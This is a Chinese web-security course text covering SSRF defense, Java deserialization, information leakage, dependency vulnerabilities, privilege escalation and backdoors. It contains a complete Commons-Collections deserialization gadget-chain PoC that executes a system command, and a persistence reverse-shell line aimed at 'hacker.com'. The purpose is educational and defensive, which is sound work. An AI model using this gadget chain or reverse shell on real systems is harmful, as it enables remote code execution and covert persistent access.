### 如何进行 SSRF 防护？

因为 SSRF 漏洞起源于业务的正常功能需求（比如百度图片的图片请求等等）。因此，我们很难真正消除它。尽管如此，我还是会为你介绍几种常见的防护手段，来尽可能地提高应用的安全性。这些常见的手段主要包括：白名单限制、协议限制和请求端限制。

白名单的限制永远是最简单、最高效的防护措施。 SSRF 中的白名单，就是对用户提交上来的目标 URL 进行限制。比如，只允许是同一个域名下的 URL。你可以理解为，让百度图片的代理服务只允许代理 baidu.com 的 URL。但是，很多时候，因为业务功能的设计，白名单的限制并不可行。比如，上述百度图片的例子，这个功能的设计思路就是，baidu.com 这个域名下能够请求各类域名下的图片资源（比如上述例子中的 sinaimg.cn）。

在这种时候，我们可以对协议和资源类型等进行限制。比如：对于使用协议，我们只允许 HTTP 或者 HTTPS 协议；对于返回的内容，我们只允许图片格式的内容。通过这些限制，虽然不能完全阻止黑客发起 SSRF 攻击，但也大大降低了黑客能够造成的危害。

除此之外，因为 SSRF 最终的结果，是接受代理请求的服务端发生数据泄露。所以，SSRF 防护不仅仅涉及接收 URL 的服务端检测，也需要接受代理请求的服务端进行配合。在这种情况下，我们就需要用到请求端限制，它的防护措施主要包括两个方面。

第一，为其他业务提供的服务接口尽量使用 POST，避免 GET 的使用。因为，在 SSRF 中（以及大部分的 Web 攻击中），发起一个 POST 请求的难度是远远大于 GET 请求的。因为默认的请求方式是 GET，而发起 POST 请求，需要在发起 HTTP 请求的时候进行配置。很多安全漏洞中不包含能够配置协议的地方。在上述百度图片的例子中，黑客显然就只能发起 GET 请求。如果某个敏感服务是 POST 的，黑客就无法请求到相关资源了。

第二，为其他业务提供的服务接口，最好每次都进行验证。通过 SSRF，黑客只能发起请求，并不能获取到服务端存储的验证信息（如认证的 key 和 secret 等）。因此，只要接受代理请求的端对每次请求都进行完整的验证，黑客无法成功通过验证，也就无法完成请求了。

**小结**

![11][11]

## 反序列化漏洞

你一定使用过一些序列化和反序列化的工具，比如 Fastjson 和 Jackson 等。如果你关注这些工具的版本更新，就会发现，这些版本更新中包含很多修复反序列化漏洞的改动。

### 反序列化漏洞是如何产生的？

序列化和反序列化有很多种实现方式。比如 Java 中的 Serializable 接口（或者 Python 中的 pickle）可以把应用中的对象转化为二进制的字节流，把字节流再还原为对象；还有 XML 和 JSON 这些跨平台的协议，可以把对象转化为带格式的文本，把文本再还原为对象。

那反序列化漏洞到底是怎么产生的呢？问题就出在把数据转化成对象的过程中。在这个过程中，应用需要根据数据的内容，去调用特定的方法。而黑客正是利用这个逻辑，在数据中嵌入自定义的代码（比如执行某个系统命令）。应用对数据进行反序列化的时候，会执行这段代码，从而使得黑客能够控制整个应用及服务器。这就是反序列化漏洞攻击的过程。

事实上，基本上所有语言都会涉及反序列化漏洞。其中，Java 因为使用范围比较广，本身体积也比较庞大， 所以被曝出的反序列化漏洞最多。下面，我就以 Java 中一个经典的反序列化漏洞 demo [ysoserial](https://github.com/frohoff/ysoserial)  为基础，来介绍一个经典的反序列化漏洞案例，

最终的演示 demo 的代码如下所示。在 macOS 环境下运行这段代码，你就能够打开一个计算器。（在 Windows 环境下，将系统命令 open -a calculator 修改成 calc 即可。）注意，这里需要依赖 3.2.1 以下的 commons-collections，最新的版本已经对这个漏洞进行了修复，所以无法重现这个攻击的过程。

```java
public class Deserialize {
    public static void main(String... args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchMethodException {
        Object evilObject = getEvilObject();
        byte[] serializedObject = serializeToByteArray(evilObject);
        deserializeFromByteArray(serializedObject);
    }
    public static Object getEvilObject() throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException {
        String[] command = {"open -a calculator"};
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        command
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
        Proxy evilProxy = (Proxy) Proxy.newProxyInstance(Deserialize.class.getClassLoader(), new Class[]{Map.class}, secondInvocationHandler);
        InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);
        return invocationHandlerToSerialize;
        /*Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {
                        String.class }, new Object[] {"open -a calculator"})};
        Transformer chain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap<String, Object>();
        innerMap.put("key", "value");
        Map<String, Object> outerMap = TransformedMap.decorate(innerMap, null, chain);
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, outerMap);
        return instance;*/
    }
    public static void deserializeAndDoNothing(byte[] byteArray) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArray));
        ois.readObject();
    }
    public static byte[] serializeToByteArray(Object object) throws IOException {
        ByteArrayOutputStream serializedObjectOutputContainer = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(serializedObjectOutputContainer);
        objectOutputStream.writeObject(object);
        return serializedObjectOutputContainer.toByteArray();
    }
    public static Object deserializeFromByteArray(byte[] serializedObject) throws IOException, ClassNotFoundException {
        ByteArrayInputStream serializedObjectInputContainer = new ByteArrayInputStream(serializedObject);
        ObjectInputStream objectInputStream = new ObjectInputStream(serializedObjectInputContainer);
        InvocationHandler evilInvocationHandler = (InvocationHandler) objectInputStream.readObject();
        return evilInvocationHandler;
    }
}
```

下面我们来分析一下这段代码的逻辑。

在 Java 通过ObjectInputStream.readObject()进行反序列化操作的时候，ObjectInputStream 会根据序列化数据寻找对应的实现类（在 payload 中是sun.reflect.annotation.AnnotationInvocationHandler）。如果实现类存在，Java 就会调用其 readObject 方法。因此，AnnotationInvocationHandler.readObject方法在反序列化过程中会被调用。

AnnotationInvocationHandler在readObject的过程中会调用streamVals.entrySet()。其中，streamVals是AnnotationInvocationHandler构造函数中的第二个参数。这个参数可以在数据中进行指定。而黑客定义的是 Proxy 类，也就是说，黑客会让这个参数的实际值等于 Proxy。

![12][12]

Proxy 是动态代理，它会基于 Java 反射机制去动态实现代理类的功能。在 Java 中，调用一个 Proxy 类的 entrySet() 方法，实际上就是在调用InvocationHandler中的invoke方法。在 invoke 方法中，Java 又会调用memberValues.get(member)。其中，memberValues是AnnotationInvocationHandler构造函数中的第二个参数。

同样地，memberValues这个参数也能够在数据中进行指定，而这次黑客定义的就是 LazyMap 类。member 是方法名，也就是 entrySet。因此，我们最终会调用到LazyMap.get("entrySet")这个逻辑。

![13][13]

当 LazyMap 需要 get 某个参数的时候，如果之前没有获取过，则会调用ChainedTransformer.transform进行构造。

![14][14]

ChainedTransformer.transform会将我们构造的几个 InvokerTransformer 顺次执行。而在InvokerTransformer.transform中，它会通过反射的方法，顺次执行我们定义好的 Java 语句，最终调用Runtime.getRuntime().exec("open -a calculator")实现命令执行的功能。

![15][15]

这个过程的确比较烧脑。我带你再来总结一下，简单来说，其实就是以下 4 步：

1. 黑客构造一个恶意的调用链（专业术语为 POP，Property Oriented Programming），并将其序列化成数据，然后发送给应用；
2. 应用接收数据。大部分应用都有接收外部输入的地方，比如各种 HTTP 接口。而这个输入的数据就有可能是序列化数据；
3. 应用进行反序列操作。收到数据后，应用尝试将数据构造成对象；
4. 应用在反序列化过程中，会调用黑客构造的调用链，使得应用会执行黑客的任意命令。

那么，在这个反序列化的过程中，应用为什么会执行黑客构造的调用链呢？这是因为，反序列化的过程其实就是一个数据到对象的过程。在这个过程中，应用必须根据数据源去调用一些默认方法（比如构造函数和 Getter/Setter）。

除了这些方法，反序列化的过程中，还会涉及一些接口类或者基类（简单的如：Map、List 和 Object）。应用也必须根据数据源，去判断选择哪一个具体的接口实现类。也就是说，黑客可以控制反序列化过程中，应用要调用的接口实现类的默认方法。通过对不同接口类的默认方法进行组合，黑客就可以控制反序列化的调用过程，实现执行任意命令的功能。

### 通过反序列化漏洞，黑客能做什么？

学习了前面的例子，我们已经知道，通过反序列化漏洞，黑客可以调用到Runtime.exec()来进行命令执行。换一句话说，黑客已经能够在服务器上执行任意的命令，这就相当于间接掌控了你的服务器，能够干任何他想干的事情了。

即使你对服务器进行了一定的安全防护，控制了黑客掌控服务器所产生的影响，黑客还是能够利用反序列化漏洞，来发起拒绝服务攻击。比如，曾经有人就提出过这样的方式，通过 HashSet 的相互引用，构造出一个 100 层的 HashSet，其中包含 200 个 HashSet 的实例和 100 个 String，结构如下图所示。

![16][16]

对于多层嵌套的对象，Java 在反序列化过程中，需要调用的方法呈指数增加。因此，尽管这个序列化的数组大概只有 6KB，但是面对这种 100 层的数据，Java 所需要执行的方法数是近乎无穷的（n 的 100 次方）。也就是说，黑客可以通过构建一个体积很小的数据，增加应用在反序列化过程中需要调用的方法数，以此来耗尽 CPU 资源，达到影响服务器可用性的目的。

### 如何进行反序列化漏洞防护 ？

既然反序列化漏洞危害这么大，我们能不能直接剔除它们呢？显然是不可能的，尤其是 JSON，作为目前最热门的跨平台数据交换格式之一，其易用性是显而易见的，你不可能因为这些还没发生的危害就剔除它们。因此，我们要采取一些有效的手段，在把反序列化操作的优势发挥出来的同时，去避免反序列化漏洞的出现。我们来看 3 种具体的防护方法：认证、限制类和 RASP 检测。

#### 认证和签名

首先，最简单的，我们可以通过认证，来避免应用接受黑客的异常输入。要知道，很多序列化和反序列化的服务并不是提供给用户的，而是提供给服务自身的。比如，存储一个对象到硬盘、发送一个对象到另外一个服务中去。对于这些点对点的服务，我们可以通过加入签名的方式来进行防护。比如，对存储的数据进行签名，以此对调用来源进行身份校验。只要黑客获取不到密钥信息，它就无法向进行反序列化的服务接口发送数据，也就无从发起反序列化攻击了。

#### 限制序列化和反序列化的类

在反序列化漏洞中，黑客需要构建调用链，而调用链是基于类的默认方法来构造的。然而，大部分类的默认方法逻辑很少，无法串联成完整调用链。因此，在调用链中通常会涉及非常规的类，比如，刚才那个 demo 中的 InvokerTransformer。我相信 99.99% 的人都不会去序列化这个类。因此，我们可以通过构建黑名单的方式，来检测反序列化过程中调用链的异常。

在 Fastjson 的配置文件中，就维护了一个黑名单的列表，其中包括了很多可能执行代码的方法类。这些类都是平常会使用，但不会序列化的一些工具类，因此我们可以将它们纳入到黑名单中，不允许应用反序列化这些类（在最新的版本中，已经更改为 hashcode 的形式）。

我们在日常使用 Fastjson 或者其他 JSON 转化工具的过程中，需要注意避免序列化和反序列化接口类。这就相当于白名单的过滤：只允许某些类可以被反序列化。我认为，只要你在反序列化的过程中，避免了所有的接口类（包括类成员中的接口、泛型等），黑客其实就没有办法控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就无法利用反序列化漏洞了。

#### RASP 检测

业内推出了 RASP（Runtime Application Self-Protection，实时程序自我保护）。RASP 通过 hook 等方式，在这些关键函数的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截。简单来说，通过 RASP，我们就能够检测到应用中的非正常代码执行操作。

**小结**

![17][17]

## 信息泄露

你平时在 Debug 的时候，一定首先会去查看错误信息。根据错误信息，你能够了解究竟是什么情况引发了什么样的错误。同样地，黑客也能够通过错误信息，推断出你的后台代码逻辑

### 为什么错误信息会泄露代码逻辑？

当黑客在登录某个页面时，在用户名位置输入一个单引号，在密码位置输入一个“g”之后，就会出现如下的错误信息。

```log
An Error Has Occurred.
    Error Message:
   System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression 'username = ''' and password = 'g''. at
  System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling ( Int32 hr) at
  System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult ( tagDBPARAMS dbParams,  Object& exe
```

从这个错误信息中，我们可以看到，网页最终执行了一个 SQL 语句，这个 SQL 语句的部分内容为username = ''' and password = 'g'。因此，后台的大致逻辑应该是下面这样的。

第一，错误信息反馈的是 Syntax error，即语法错误。在密码位置输入单个字母“g”肯定不会引起错误，所以，这个 SQL 语句是因为多了一个单引号导致的报错。而如果使用了 PreparedStatement 等方法，是不会产生这个错误的。因此，后台的 SQL 查询应该是直接采用的字符串拼接，且没有过滤单引号。

第二，错误信息中显示了部分的 WHERE 条件是username = '' and password = ''。这又是一个登录的逻辑，所以，只要用户名和密码正确，这个 SQL 语句会返回黑客需要的用户信息。因此，后台的 SQL 语句应该是形如 select from where 的格式。

根据这些信息，黑客很容易就可以发起 SQL 注入攻击了。

在 Java Spring 中，我们也可以通过配置 ExceptionHandler 等来进行处理，避免被直接展示到前端。

避免错误信息泄露代码逻辑，一方面是要通过正确的配置文件，避免错误信息被展示到前端；另一方面是要对错误信息进行检测，这里就需要用到“黑盒”检测了。

所谓“黑盒（Black Box Testing，功能测试）”，就是在不获取代码的情况下，直接运行应用，然后对应用的请求和响应进行扫描。比如，在错误信息泄露的场景中，“黑盒”检测可以向应用发起一些必然会导致错误的请求（比如上述例子中的单引号），然后观察应用是返回完整的错误日志，还是返回某些经过处理的页面。

好了，现在你应该明白了，为啥错误信息会泄露代码逻辑。实际上，错误信息泄露属于一种间接的信息泄露方式。间接的信息泄露方式主要是通过拼凑各种零散信息，还原出代码整体的面貌，然后有针对性地发起攻击。所以我们常说，黑客的攻击本身就是一个“聚沙成塔”的过程。

### 除了错误信息，还有什么地方会泄露代码逻辑？

除了错误信息之外，间接的信息泄露方式还有两种：返回信息泄露和注释信息泄露。

注释信息你应该很熟悉。因为所有的前端代码基本都不需要编译就可以展示在浏览器中，所以黑客很容易就可以看到前端代码中的注释信息。但是，如果这些注释信息中出现服务器 IP、数据库地址和认证密码这样的关键信息。一旦这些关键信息被泄露，将会造成十分严重的后果。

那该如何避免关键的注释信息出现在线上的代码中呢？我们经常会使用一种叫作“白盒”的代码检测方法。

所谓“白盒（White Box Testing，结构测试）”，即直接获取到线上的源代码，然后对它进行扫描。“白盒”扫描注释信息的原理比较简单，因为每一种语言的注释都会带有特殊的标记（比如 Java 和 PHP 中的 /* 等），可以比较准确地被识别出来。除此之外，“白盒”检测通常还会被用来做一些检测代码漏洞或者逻辑漏洞的工作，这一块比较复杂，现在你只需要有一个大概印象即可，我们会在后续的课程中专门来讲。

简单了解了注释信息泄露，我们下面重点来看返回信息泄露。

你可以回忆一下，在前面讲SSRF攻击的时候，我们模拟过这样一个场景：服务端在请求一个图片地址的时候，会根据地址的“存活”情况和返回数据的类型，分别返回三种结果：“图片不存在”“格式错误”以及图片正常显示。而黑客正是通过服务端返回信息的逻辑，利用一个请求图片的 SSRF，摸清整个后端的服务“存活情况”。

类似的多种返回状态的场景还有很多，你可以想想自己平时工作中有没有遇到过。这里我再说一个常见的。当你在登录应用的时候，应用的返回逻辑可能是这样的：如果输入的用户名和密码正确，则登录成功；如果应用没有这个用户，则返回“用户名不存在”；如果输入的用户名和密码不匹配，则返回“密码错误”。

尽管这样清晰的登录提示对于用户体验来说，确实是一个较优解，但这个逻辑同样也暴露了过多的信息给黑客。黑客只需要不断地发起登录请求，就能够知道应用中存在的用户名，然后通过遍历常见的弱密码进行尝试，很容易就能够猜对密码。这样一来，猜对密码的成功率就比尝试同时猜测用户名和密码要高很多。

实际上，返回信息过于明确不算是代码层面的漏洞，更多的是产品层面的漏洞。因此，理论上没有任何技术手段能够对这种漏洞进行检测，只能依靠人为的分析审计来避免。解决方案也比较简单，直接将返回信息模糊化、统一化即可。比如，在上述登录的场景中，我们可以将两种登录失败的返回信息，统一修改为“用户名不存在或密码错误”。这样一来，既避免了用户体验受到太大影响，又消除了关键信息被黑客获取的隐患。

### 有哪些常见的直接泄露方式？

在间接的泄露方式中，黑客可以通过“蛛丝马迹”，推断出服务代码的逻辑。但是信息泄露最普遍的方式还是直接泄露 。这里我会讲两种常见的直接泄露方式。

第一种泄露方式与版本管理工具中的隐藏文件有关。

在开发应用的过程中，你一定使用过版本管理工具（比如 SVN 和 Git），通过这些工具，你能够很方便地进行代码回滚、备份等操作。那你有没有想过，版本管理工具为什么这么方便呢？它的工作原理又是怎么样的呢？我们以 SVN 为例来说一说。

SVN 会在项目目录中创建一个.svn 文件夹，里面保存了应用每一个版本的源文件信息，这也是 SVN 实现代码回滚的数据基础。如果 SVN 可以通过.svn 中的数据提取应用任意版本的代码，那黑客也可以。只要你没有在上线代码的时候删除其中的.svn 目录，那就代表黑客可以通过.svn 中的 URL 访问里面的所有文件。接下来，只需要通过执行简单的脚本，黑客就可以回溯出一个完整版本的代码了。

对于这种因为目录中额外内容（.svn/.git）导致的源码泄露，我们一方面需要对线上代码进行人工的代码审查，确保无关的文件和文件夹被正确地清除；另一方面，我们也可以在 HTTP 服务中对部分敏感的路径进行限制。比如，在 Apache httpd 中配置下面的内容，来禁止黑客对.svn 和.git 目录的访问。

```xml
<DirectoryMatch \.(svn|git)>
  Order allow,deny
  Deny from all
</DirectoryMatch>
```

除此之外，还有一种最常见、也最不容易注意的泄露方式，那就是上传代码到 GitHub 上。

我们知道，Git 除了是一个版本管理工具之外，还是一个很流行的代码管理工具。除了前面讲过的隐藏文件漏洞之外（Git 会生成.git，同样包含应用各种版本的文件信息），Git 还存在将代码上传到公开平台的问题。但是，使用 GitHub 上传代码通常属于个人行为，所以，我们很难从技术层面上进行预防。

公司应该从加强员工安全意识的培训、强化公司管理制度入手，避免员工私自上传代码。除此之外，公司还可以对 GitHub 发起巡检（比较知名的工具有`Hawkeye`），通过定期检索公司代码的关键字（比如常用的包名、域名等）来进行检测。

## 插件漏洞

在讲反序列化漏洞的时候，我们说过，这个漏洞其实就存在于 Fastjson、Jackson 等知名的 JSON 解析库中，跟你自己写的代码没有太多关系，所以极难掌控。也就是说，在开发应用的过程中，尽管你的代码很安全了，黑客还是能够通过插件漏洞对应用发起攻击（我文中提到的插件，是第三方的插件、依赖库、工具和框架等的统称）。

说到这儿，想不想测试一下你的插件是否安全？在这里，我准备了几个问题，你可以看看自己是否对所用的插件了如指掌。

- 你所使用的所有插件的版本是什么？（包括前端和后端，直接引用和间接引用）
- 你所使用的这些插件，是否存在漏洞，是否不被维护了，是否被废弃了？
- 你所使用的这些插件，会在哪些地方发布更新信息和漏洞信息？
- 你所使用的这些插件，是否会定期更新？你是否会对更新插件进行完整的测试？
- 你所使用的这些插件，在安全方面，有哪些配置需要关注?

### 为什么要重视插件漏洞？

在谈论安全漏洞的时候，你应该经常会听到“0 day”（中文译为“零日”）这个词。到底什么是“0 day”呢？“0 day”，即在插件发布修复漏洞的安全补丁之前，黑客就已经知道漏洞细节的漏洞。换一句话说，“0 day”就是只有黑客知晓的未公开漏洞。

说到这里，不知道你有没有听说过一个叫作脏牛（CVE-2016-5195）的 Linux 系统漏洞，这个漏洞可以实现提权操作，也就是让低权限的用户获得较高权限。在这个漏洞被公开曝出之前，它已经存在于 Linux 系统中长达 9 年了，直到现在，仍然有很多黑客通过这个漏洞获取较高的系统权限。

而这其实就是一个“0 day”漏洞。因为只有黑客知道这个漏洞，而我们连这个漏洞是什么都不知道，所以“0 day”几乎无法防御。除此之外，“0 day”还具备极高的攻击有效性，可以说只要应用使用了对应的插件，黑客几乎“战无不胜”。甚至在黑市上，“0 day”漏洞都可以作为一种资产在黑客间进行交易。

### 如何建立插件漏洞的防护体系？

#### 第一步：整理插件，剔除无用插件

避免插件漏洞威胁的第一步，自然是了解自己的应用都使用了哪些插件。我就以 Java 中的 Maven 插件管理工具为例，详细说一下整理和剔除插件的过程。

如果使用 Maven 作为插件管理工具的话，你一定会先通过 POM 文件去找到自己所使用的插件（即所有的 Dependency）。但是，Dependency 只是你的应用中直接使用的插件，这些插件本身也会引用很多其他插件。所以大部分应用的插件依赖树十分复杂，那你该如何整理全部的插件呢？

首先，你可以通过Maven Dependency Plugin帮助自己自动分析插件依赖树。除了展示出当前 Maven 工程中所有的使用插件，Maven Dependency Plugin 还会对插件的使用情况做进一步地分析，帮你找出在 POM 中却没在代码中使用的插件。这样，你就可以对这一类无用的插件引用及时剔除，自然也就能够减少插件漏洞出现的可能性。

比如，在下面这个分析结果中，通过mvn dependency:analyze的分析，我们发现了 JUnit 和 Logback 这类“虽然被引用但却没有被使用”的插件。既然没有被使用，那我们就可以很放心地进行删除了。

```bash
mvn dependency:tree dependency:analyze
...
[INFO] --- maven-dependency-plugin:2.8:tree (default-cli) @ client ---
[INFO] com.coveros:sample-maven:jar:0.0.1-SNAPSHOT
[INFO] +- junit:junit:jar:4.11:test
[INFO] |      \- org.hamcrest:hamcrest-core:jar:1.3:test
[INFO] +- org.slf4j:slf4j-api:jar:1.7.5:compile
[INFO] \- ch.qos.logback:logback-classic:jar:1.0.13:test
[INFO]    \- ch.qos.logback:logback-core:jar:1.0.13:test
...
[INFO] --- maven-dependency-plugin:2.8:analyze (default-cli) @ client ---
[WARNING] Unused declared dependencies found:
[WARNING]    junit:junit:jar:4.11:test
[WARNING]    ch.qos.logback:logback-classic:jar:1.0.13:test
...
```

#### 第二步：管理插件补丁更新

建立插件防护体系的第二步，就是要知道你有哪些插件需要更新。但是，在实际工作中一个应用随便就依赖几十个插件，你当然没办法一个一个去查询插件的更新状态了。那Version Maven Plugin就是用来帮你检查版本更新的一个工具。你可以看到，在下面的分析结果中，通过mvn version:display-dependency-updates这个命令，我们就能发现 JUnit 有一个新的 4.11 版本。

```bash
mvn versions:display-plugin-updates versions:display-dependency-updates
...
[INFO] --- versions-maven-plugin:2.1:display-plugin-updates (default-cli) @ sample-maven ---
[INFO]
[INFO] The following plugin updates are available:
[INFO]   maven-deploy-plugin ...................................... 2.7 -> 2.8
[INFO]
[INFO] All plugins have a version specified.
[INFO]
[INFO] Project defines minimum Maven version as: 3.0
[INFO] Plugins require minimum Maven version of: 3.0
[INFO]
[INFO] No plugins require a newer version of Maven than specified by the pom.
[INFO]
[INFO]
[INFO] --- versions-maven-plugin:2.1:display-dependency-updates (default-cli) @ sample-maven ---
[INFO] The following dependencies in Dependencies have newer versions:
[INFO]   junit:junit ............................................. 4.10 -> 4.11
...
```

尽管 Version Maven Plugin 也提供自动更新的功能，不过我更推荐你手动进行更新。因为对于插件的版本变更，其兼容性并没有保证，而且你也无法保证，插件在更新的过程中，不会对它原本的功能产生影响。

那使用了补丁管理工具之后，我们就可以完全放心了吗？当然不是。补丁管理中依旧存在一些问题，我这里从 3 个方面帮你梳理了一下，你可以作为了解。

- 补丁可用性：并不是所有的插件漏洞，都能有最新的补丁进行及时地更新和维护。很多时候，运维人员会面临一个已知的漏洞，但无补丁“可打”的窘迫局面。
- 覆盖面不全：实际上，并不是所有语言都能够很好的进行插件分析工作，这也就导致运维人员无法掌控公司内使用的所有插件。这个时候，必然会产生一定的漏洞疏忽。
- 更新时间延迟：为了提高打补丁的效率，补丁管理一般会按月或者按季度进行集中的打补丁工作。而在这个期间，公司的应用就会处于无保护的状
态。

为了解决这些问题，虚拟补丁的概念就被提出了。所谓虚拟补丁，就是在不对应用插件进行升级的情况下，有效阻止攻击流量。实现的原理也很简单，即在前置的网络或系统中，对针对插件漏洞的攻击流量进行检测和拦截即可，大部分防火墙、IPS 等安全防御工具，都会提供虚拟补丁的功能。比如，2017 年，永恒之蓝肆虐的时候，防火墙会直接封禁 445 端口请求，就相当于给所有的 Windows 系统，打上了虚拟补丁。然后，只需要等到所有 Windows 都真正更新补丁之后，再放开对 445 端口的限制即可。

#### 第三步：使用公开漏洞库

最后，你还需要知道，在你所使用的插件中，是否已经存在了公开的漏洞。

实际上，每个漏洞的编号都是该漏洞在公开漏洞库的唯一编号。我提到的这三个编号，开头都是 CVE，也就是说，这三个编号的信息都存在于CVE（Common Vulnerabilities & Exposures，公共漏洞和暴露）这个公开漏洞库中，你可以根据漏洞的唯一编号，在 CVE 中快速地找到这个漏洞相关的信息，包括：受影响的版本、可能造成的影响、修复的方法及补丁等。

除了 CVE 之外，公开的漏洞库还包括CWE（Common Weakness Enumeration，通用缺陷列表）、CVSS（Common Vulnerability Scoring System，通用漏洞评分系统）、NVD（National Vulnerability Database，国家信息安全漏洞库）以及CNVD(China National Vulnerability Database，中国国家信息安全漏洞库）。

那实际工作中，我们其实也可以借助工具，自动化地完成匹配公开漏洞库的工作。OWASP Dependency-Check是一款专门进行插件漏洞检测的工具。它会将工程内的插件和公开的漏洞库进行比对。最终，会生成一个网页形式的报告，使你对工程中的插件漏洞一目了然了。下图就展示了，如何通过 OWASP Dependency-Check 发现一个 3.2.1 版本的 Commons-Collections 的高危漏洞。

同理，在其他语言中，也会存在类似的插件管理工具。比如对于 JavaScript 中的插件，我们可以使用Retire.js进行整理。

总结来说，我们在建立插件漏洞的防护体系时，会使用这些自动化管理工具完成这样三件事情：

- 统计你的应用中引用了哪些插件
- 管理这些插件中是否有版本更新
- 检测这些插件是否存在已知的漏洞

## 权限提升和持久化

### 权限提升：为什么黑客能通过 SSRF 拿到服务器权限？

在应用或系统中，黑客或者被黑客控制的用户，通常会通过漏洞攻击或者利用弱密码，获取到其他用户的权限。在获取了新的用户权限之后，黑客就能够以新用户的身份去窃取和篡改数据，进行非法的操作了。这就是权限提升（Privilege Escalation）。也就是说，黑客可以通过不断获取新的身份，来不断扩大（或者叫提升）自己的权限，不断扩大攻击影响，最终实现控制整个系统。

水平提升是指黑客获取了另外一个“平级”用户的权限。尽管权限等级没变，但因为黑客控制的用户身份发生了变更，所以黑客能够获得新的数据和权限。比如，常见的普通用户被盗号就是一种水平提升。黑客本来只能够登录自己的账号，但他却通过破解密码的方式，登录到其他用户的账号，从而可以查看他人的个人信息，利用他人账号进行交易转账。

相比较来说，垂直提升的危害性更大。通过垂直越权，黑客能够获得一个更高级别的权限，通常来说，是应用的管理员或系统的 ROOT 权限。拥有高等级权限后，黑客自然就能够获取到大部分的数据了。除此之外，通过高等级的权限，黑客还能够禁用审计功能、删除相关日志，从而隐匿自己的行踪，让你无法发现攻击事件的存在。

首先，这个 SSRF 是有回显的，所有内网请求的响应都能够直接被黑客看到。所以，黑客利用.svn 文件的信息泄露，一点一点请求内网的各种地址，最终获得了一台服务器上的代码。获得代码之后，黑客通过分析，知道这个服务器存在 SQL 注入漏洞。于是，黑客通过 SQL 注入，成功在这台服务器上执行了命令。然后，黑客就开始对内网进行 SSH 扫描，最终以用户名“root”和密码“123456”，成功获得了一台内网服务器的 ROOT 权限。

![18][18]

事实上，几乎所有的漏洞和攻击（包括前面讲到的几个 Web 漏洞）都可能导致权限提升。总体来说，权限提升的方法可以分为下面这两种。

- 窃取身份：前面我们讲过，身份认证的相关风险和攻击包括：无认证、弱密钥、认证信息泄露和认证环节破解等。这些攻击的最终结果其实都一样，就是黑客成功登录了他人的账号，也就意味着权限提升的发生。
- 利用漏洞获得权限：从行业现状来说，对于补丁管理的工作普遍做得不到位，各种有漏洞的系统和插件仍在大量使用。因此，权限提升最普遍的方法还是利用漏洞获得权限。这其中，既包括已公开的漏洞，比如上节课中提到的“脏牛”，还包括很多资深黑客所掌握的“0 day”漏洞。

### 权限持久化：为什么漏洞修复了，还有“后门”？

#### 什么是“后门”？

当黑客通过权限提升，成功获取到一个高级别的权限后，为了保留这个权限，黑客会在应用中留下一个隐藏的进程，下次只要黑客想再次进入，就可以通过这个进程来连通，而不需要再次去绕过各种安全流程。这就是“后门”。也就是说，“后门”能够让你在不经过正常流程的情况下，就直接获得一些权限。

比如说，黑客在进入服务器之后，会留下下面这样一个脚本，让这个脚本，每分钟都执行一次：

```bash
bash -i >& /dev/tcp/hacker.com/8080 0>&1
```

这个脚本运行后，只要 hack.com 的 8080 端口打开，那么服务器就会通过 TCP 获取 8080 端口返回的命令并执行。因此，只要黑客任意时刻在 hacker.com 中监听 8080 端口（比如通过 nc -l 8080），就可以获得服务器定时送上来的命令执行权限。

所以，不管漏洞是否修复，黑客都可以通过这个快速通道轻松进入系统。而“后门”的关键意义就在于，为黑客长时间保持高权限的通道，使得黑客能够进行长时间地潜伏和攻击。

比较有意思的是，“后门”不仅仅是为黑客服务的，正常的应用中可能也会留下一些“后门”以备特殊情况。比如，2008 年，微软曾进行过一次打击盗版 Windows 的行动，当时国内的盗版 Windows 在同一时间出现了黑屏现象。显然，微软不可能知道所有人的管理员密码，但是微软会通过预留的“后门”实现对系统的控制。类似情况还有很多，比如，管理员在特殊情况下（比如忘记密码），可以通过“后门”对应用进行一些操作。

#### “后门”是如何工作的？

我们前面讲过的所有攻击方式，通常都是为了造成一些显式的攻击。而“后门”的目的则不同，“后门”会尽力隐藏自己不被别人发现。因此，“后门”通常会以木马的形式出现。

所谓木马（Trojan），就是一些外表看起来正常，但会对应用和系统进行破坏的服务和进程。比如，很早之前流行过的“灰鸽子”木马，就是和正常的应用绑定在一起。这样“灰鸽子”就能在应用运行的时候监控应用的全部操作了（屏幕、键盘、摄像头等）。又因为应用正常的功能不会受到影响，所以，用户几乎感知不到“灰鸽子”的存在。

